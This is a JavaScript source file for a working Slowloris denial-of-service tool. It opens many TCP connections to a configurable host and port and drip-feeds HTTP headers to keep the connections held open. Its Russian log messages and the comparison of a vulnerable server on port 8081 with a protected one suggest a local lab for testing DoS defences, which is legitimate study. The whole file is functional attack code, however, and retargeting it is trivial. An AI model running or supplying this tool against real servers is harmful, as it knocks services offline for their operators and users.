const net = require('net');
const log = require('../utils/logger');

class SlowlorisAttacker {
  constructor(targetPort = 8080, targetHost = 'localhost') {
    this.targetPort = targetPort;
    this.targetHost = targetHost;
    this.connections = [];
    this.attackInterval = null;
    this.stats = {
      connections: 0,
      active: 0,
      closed: 0
    };
  }

  startAttack(connectionsCount = 30, headerDelay = 3000) {
    log.section('ЗАПУСК SLOWLORIS АТАКИ');
    log.attack(`Цель: ${this.targetHost}:${this.targetPort}`);
    log.attack(`Количество соединений: ${connectionsCount}`);
    log.attack(`Задержка между заголовками: ${headerDelay}мс`);

    for (let i = 0; i < connectionsCount; i++) {
      setTimeout(() => {
        this.createSlowConnection(i, headerDelay);
      }, i * 100);
    }

    this.monitorInterval = setInterval(() => {
      this.showStats();
    }, 5000);
  }

  createSlowConnection(id, headerDelay) {
    const socket = net.createConnection(this.targetPort, this.targetHost, () => {
      log.attack(`[SLOW ${id}] Соединение установлено, начинаю медленную отправку...`);

      this.stats.connections++;
      this.stats.active++;

      socket.write(`GET / HTTP/1.1\r\n`);
      socket.write(`Host: ${this.targetHost}\r\n`);
      socket.write(`User-Agent: Slowloris/1.0\r\n`);

      let headerCount = 0;
      const headerInterval = setInterval(() => {
        if (headerCount < 20) {
          socket.write(`X-Slow-Header-${headerCount}: ${'x'.repeat(100)}\r\n`);
          log.attack(`[SLOW ${id}] Отправлен заголовок ${headerCount}`);
          headerCount++;
        } else {
          log.attack(`[SLOW ${id}] Все заголовки отправлены, держим соединение...`);
          clearInterval(headerInterval);
        }
      }, headerDelay);

      socket.headerInterval = headerInterval;
    });

    socket.on('error', (err) => {
      if (err.code === 'ECONNRESET') {
        log.attack(`[SLOW ${id}] Соединение сброшено сервером (ЗАЩИТА СРАБОТАЛА!)`);
        this.stats.active--;
        this.stats.closed++;
      } else if (err.code === 'ETIMEDOUT') {
        log.attack(`[SLOW ${id}] Таймаут соединения (ЗАЩИТА СРАБОТАЛА!)`);
        this.stats.active--;
        this.stats.closed++;
      }
    });

    socket.on('close', () => {
      log.attack(`[SLOW ${id}] Соединение закрыто`);
      if (socket.headerInterval) {
        clearInterval(socket.headerInterval);
      }
      this.stats.active--;
      this.stats.closed++;
    });

    this.connections.push(socket);
  }

  showStats() {
    log.section('СТАТУС SLOWLORIS АТАКИ');
    log.attack(`Всего создано соединений: ${this.stats.connections}`);
    log.attack(`Активных соединений: ${this.stats.active}`);
    log.attack(`Закрыто сервером: ${this.stats.closed}`);

    const protectionRatio = this.stats.closed / this.stats.connections;

    if (this.targetPort === 8081) {
      if (protectionRatio < 0.3) {
        log.warn('Уязвимый сервер НЕ защищен от Slowloris (большинство соединений активны)');
      }
    } else {
      if (protectionRatio > 0.3) {
        log.success('Защищенный сервер УСПЕШНО блокирует Slowloris атаку!');
      } else {
        log.warn('Защищенный сервер НЕ справляется с Slowloris атакой!');
      }
    }
  }

  stopAttack() {
    if (this.monitorInterval) {
      clearInterval(this.monitorInterval);
    }

    this.connections.forEach(socket => {
      if (socket.headerInterval) {
        clearInterval(socket.headerInterval);
      }
      socket.destroy();
    });
    this.connections = [];

    log.section('SLOWLORIS АТАКА ОСТАНОВЛЕНА');
  }
}

if (require.main === module) {
  const attacker = new SlowlorisAttacker(8080);

  attacker.startAttack(20, 2000);

  setTimeout(() => {
    attacker.stopAttack();
  }, 20000);
}

module.exports = SlowlorisAttacker;